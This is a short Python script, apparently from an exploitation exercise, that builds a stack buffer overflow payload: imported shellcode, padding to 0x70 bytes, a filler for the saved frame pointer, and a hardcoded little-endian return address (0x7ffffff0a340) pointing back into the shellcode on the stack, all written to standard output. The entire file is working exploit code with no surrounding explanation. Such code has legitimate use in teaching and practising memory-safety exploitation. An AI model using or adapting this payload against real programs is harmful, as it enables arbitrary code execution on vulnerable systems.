#!/usr/bin/env python3

from shellcode import shellcode
import sys

rbp_size = 8

padding = b"X" * (0x70 - len(shellcode))
rbp = b"Y" * rbp_size

shellcode_adr = 0x7ffffff0a340
return_address = shellcode_adr.to_bytes(8, "little")

combined = shellcode + padding + rbp + return_address


sys.stdout.buffer.write(combined)